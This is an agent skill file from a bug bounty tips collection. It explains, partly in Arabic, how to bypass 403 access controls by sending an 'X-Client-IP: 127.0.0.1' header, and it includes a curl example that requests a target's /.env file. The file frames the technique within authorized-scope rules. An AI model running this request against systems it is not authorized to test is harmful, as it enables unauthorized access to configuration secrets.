# SKILL: Bypass 403 Forbidden بإضافة X-Client-IP: 127.0.0.1

**Skill id:** `tip/bypass-403-forbidden-بإضافة-x-client-ip-127001`  
**Category:** WAF Bypass, Recon  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e8808166876deacb1a043073  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **WAF Bypass, Recon**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

بعض الـ WAFs أو الـ access control بيعتمد على headers بتوضح IP الطلب (زي X-Client-IP)، لو ضفت header بيقول إن الطلب جاي من [localhost](http://localhost)، السيرفر ممكن يعاملك كأنك مستخدم موثوق ويديك wall bypass لفتح 403 محمي.

## Payload / Code

```
X-Client-IP: 127.0.0.1

مثال تنفيذي:
curl -I [https://target\[.\]com/.env](https://target[.]com/.env) -H "X-Client-IP: 127.0.0.1"

النتيجة المتوقعة: 403 يبقى 302/200 بعد إضافة الـ header
```

## Source

kjulius @ethical\_h4ck3r\_

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
